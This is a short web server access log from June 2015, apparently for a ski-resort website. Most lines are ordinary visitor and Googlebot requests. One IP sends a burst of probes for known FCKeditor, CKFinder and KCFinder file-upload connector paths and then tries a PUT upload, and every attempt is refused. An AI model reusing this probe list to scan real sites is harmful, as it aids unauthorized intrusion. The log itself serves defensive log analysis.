107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/connectors/php/connector.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/connectors/php/upload.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/upload/asp/upload.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /ckeditor/ckfinder/core/connector/asp/connector.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /ckeditor/ckfinder/core/connector/php/connector.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /ckeditor/ckfinder/core/connector/aspx/connector.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /kcfinder/browse.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "PUT /ali.txt HTTP/1.1" 405 561 "-" "-"
75.42.73.204 - - [05/Jun/2015:11:33:22 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/7.1.2 Safari/537.85.11"
99.46.25.131 - - [05/Jun/2015:11:39:14 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36"
66.249.75.40 - - [05/Jun/2015:11:39:39 -0700] "GET /resorts?resort=showdown&date=2014-01-31 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
70.196.200.216 - - [05/Jun/2015:11:48:57 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4"
66.249.75.48 - - [05/Jun/2015:11:49:31 -0700] "GET /resorts?resort=skicooper&date=2014-02-02 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
